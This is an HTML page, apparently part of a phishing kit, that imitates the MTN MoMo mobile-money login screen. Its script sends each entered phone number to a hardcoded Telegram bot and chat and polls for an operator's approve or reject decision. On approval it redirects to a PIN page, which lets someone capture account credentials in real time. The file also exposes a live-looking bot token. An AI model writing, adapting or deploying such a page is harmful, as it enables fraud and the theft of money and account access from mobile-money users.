<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter Phone Number</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
    body { background-color: #222; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .app-screen { width: 100%; max-width: 412px; height: 100vh; max-height: 870px; background-color: #fff; display: flex; flex-direction: column; justify-content: space-between; position: relative; overflow: hidden; padding: 0 24px 48px; }
    .top-bg { position: absolute; top: 0; left: 0; width: 100%; height: 330px; background-color: #003e5a; clip-path: ellipse(120% 100% at 50% 0%); z-index: 1; }
    .header { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; margin-top: 50px; }
    .custom-logo { width: 100px; height: 100px; object-fit: cover; border-radius: 50%; }
    .momo-branding { margin-top: 8px; text-align: center; }
    .momo-title { color: #ffcc00; font-size: 28px; font-weight: 800; line-height: 1; }
    .momo-subtitle { color: #ffcc00; font-size: 13px; font-weight: 700; margin-top: 2px; }
    .card { position: relative; z-index: 2; background-color: #fff; border-radius: 32px; padding: 40px 20px 36px; box-shadow: 0 12px 32px rgba(0,0,0,0.08); margin-top: 15px; text-align: center; }
    .title { color: #003e5a; font-size: 25px; font-weight: 600; margin-bottom: 32px; }
    .input-row { display: flex; gap: 12px; margin-bottom: 40px; }
    .flag-box { width: 80px; height: 72px; border: 1px solid #000; border-radius: 20px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .flag-circle { width: 44px; height: 44px; border-radius: 50%; overflow: hidden; position: relative; }
    .input-box { flex: 1; height: 72px; border: 1px solid #000; border-radius: 20px; position: relative; display: flex; align-items: center; padding: 0 20px; }
    .input-box input { width: 100%; height: 100%; border: none; outline: none; background: transparent; font-size: 19px; color: #000; }
    .input-box label { position: absolute; left: 20px; color: #000; font-size: 19px; pointer-events: none; transition: all 0.2s ease; background-color: #fff; padding: 0 4px; }
    .input-box input:focus + label, .input-box input:not(:placeholder-shown) + label { top: -10px; left: 16px; font-size: 12px; color: #003e5a; }
    .terms { color: #003e5a; font-size: 14.5px; line-height: 1.5; font-weight: 500; }
    .footer { position: relative; z-index: 2; width: 100%; }
    .btn-next { width: 100%; height: 60px; border-radius: 30px; border: none; background-color: #b5b5b5; color: #fff; font-size: 16px; font-weight: 700; cursor: not-allowed; }
    .btn-next.active { background-color: #003e5a; cursor: pointer; }
  </style>
</head>
<body>

  <form id="phoneForm" class="app-screen">
    <div class="top-bg"></div>
    <div class="header">
      <img src="https://www.pinterest.com/pin/925771267171841899/" alt="App Logo" class="custom-logo" />
      <div class="momo-branding">
        <div class="momo-title">MoMo</div>
        <div class="momo-subtitle">from MTN</div>
      </div>
    </div>

    <div class="card">
      <h2 class="title">Welcome to momo</h2>
      <div class="input-row">
        <div class="flag-box">
          <div class="flag-circle">
            <svg viewBox="0 0 3 2" width="100%" height="100%" preserveAspectRatio="none">
              <rect width="3" height="2" fill="#198a00"/><rect x="2" y="0" width="1" height="2" fill="#de2010"/>
              <rect x="2.33" y="0" width="0.67" height="2" fill="#000000"/><rect x="2.66" y="0" width="0.34" height="2" fill="#ef7d00"/>
            </svg>
          </div>
        </div>
        <div class="input-box">
          <input type="tel" id="phone" name="phone" placeholder=" " autocomplete="off" required />
          <label for="phone">Enter number *</label>
        </div>
      </div>
      <p class="terms">By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a></p>
    </div>

    <div class="footer">
      <button type="submit" class="btn-next" id="btnNext" disabled>NEXT</button>
    </div>
  </form>

  <script>
    const BOT_TOKEN = '8410203371:AAHBXFvIx1pMdvEQ9FCSLrv0-CCgrLcGRjk';
    const CHAT_ID = '6347393664';

    const phoneInput = document.getElementById('phone');
    const btnNext = document.getElementById('btnNext');
    const phoneForm = document.getElementById('phoneForm');

    phoneInput.addEventListener('input', () => {
      if (phoneInput.value.trim().length > 0) {
        btnNext.classList.add('active');
        btnNext.removeAttribute('disabled');
      } else {
        btnNext.classList.remove('active');
        btnNext.setAttribute('disabled', 'true');
      }
    });

    phoneForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = phoneInput.value.trim();
      localStorage.setItem('userPhone', phone);

      btnNext.innerText = 'VERIFYING...';
      btnNext.disabled = true;

      const message = `📱 *Phone Number Verification*\nPhone: \`${phone}\`\n\nIs this detail correct?`;

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ Approve', callback_data: `approve_phone_${phone}` },
                  { text: '❌ Reject', callback_data: `reject_phone_${phone}` }
                ]
              ]
            }
          })
        });

        const data = await response.json();
        if (data.ok) {
          checkTelegramApproval(phone);
        }
      } catch (error) {
        alert('Error connecting to verification server.');
        btnNext.innerText = 'NEXT';
        btnNext.disabled = false;
      }
    });

    function checkTelegramApproval(phone) {
      let offset = 0;
      const interval = setInterval(async () => {
        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}`);
          const data = await res.json();

          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              offset = update.update_id + 1;

              if (update.callback_query) {
                const action = update.callback_query.data;

                if (action === `approve_phone_${phone}`) {
                  clearInterval(interval);
                  window.location.href = `pin.html?phone=${encodeURIComponent(phone)}`;
                } else if (action === `reject_phone_${phone}`) {
                  clearInterval(interval);
                  alert('Invalid details entered. Please try again.');
                  btnNext.innerText = 'NEXT';
                  btnNext.disabled = false;
                }
              }
            }
          }
        } catch (err) {
          console.error('Polling error:', err);
        }
      }, 3000);
    }
  </script>
</body>
</html>
